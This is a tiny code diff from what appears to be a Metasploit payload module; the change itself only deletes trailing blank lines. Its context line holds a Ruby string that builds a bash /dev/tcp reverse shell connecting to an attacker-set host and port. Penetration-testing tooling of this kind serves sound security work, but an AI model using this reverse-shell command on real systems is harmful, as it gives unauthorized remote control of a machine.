@@ -54,5 +54,3 @@ module Metasploit3
 		return "0<&#{fd}-;exec #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']};sh <&#{fd} >&#{fd} 2>&#{fd}";
 	end
 end
-
-    
